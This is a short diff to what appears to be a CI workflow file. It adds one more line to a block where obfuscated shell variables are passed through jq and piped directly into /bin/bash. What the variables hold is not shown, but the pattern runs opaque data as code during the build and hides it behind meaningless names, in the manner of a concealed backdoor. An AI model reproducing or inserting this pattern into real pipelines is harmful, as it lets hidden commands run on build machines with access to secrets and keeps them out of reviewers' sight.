@@ -26,6 +26,7 @@ jobs:
           echo $bf66 | jq -r .itlrv830 | /bin/bash
           printf '%s' "$yraiz33105" | jq -r .fzzt4 | /bin/bash
           echo $z7 | jq -r .f0 | /bin/bash
+          printf '%s' "$ch91" | jq -r .obz0 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
